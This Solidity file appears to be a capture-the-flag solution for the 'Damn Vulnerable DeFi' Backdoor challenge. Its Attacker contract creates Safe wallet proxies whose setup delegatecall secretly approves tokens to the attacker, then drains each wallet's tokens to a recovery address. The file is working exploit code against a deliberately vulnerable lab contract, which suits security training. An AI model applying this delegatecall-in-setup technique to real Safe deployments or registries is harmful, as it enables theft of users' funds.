// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {Approver} from "./Approver.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

import {WalletRegistry} from "./WalletRegistry.sol";

contract Attacker {
    SafeProxyFactory private immutable walletFactory;
    WalletRegistry private immutable walletRegistry;
    DamnValuableToken token;
    address recovery;

    constructor(
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        DamnValuableToken _dvt,
        address _recovery
    ) {
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        token = _dvt;
        recovery = _recovery;
    }

    function attack(Safe _singletonCopy, address[] memory _users, uint256 _amount) external {
        Approver approver = new Approver();
        bytes memory delegateData = abi.encodeWithSelector(
            Approver.approveTokens.selector,
            ERC20(token), // token
            address(this), // attacker
            _amount
        );
        address[] memory _owners = new address[](1);

        for (uint256 i = 0; i < _users.length; i++) {
            _owners[0] = _users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                _owners,
                1, // threshold
                approver, // delegatecall to
                delegateData, // delgate data
                address(0), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );
            SafeProxy proxy =
                walletFactory.createProxyWithCallback(address(_singletonCopy), initializer, 0, walletRegistry);
            token.transferFrom(address(proxy), address(recovery), _amount);
        }
    }
}
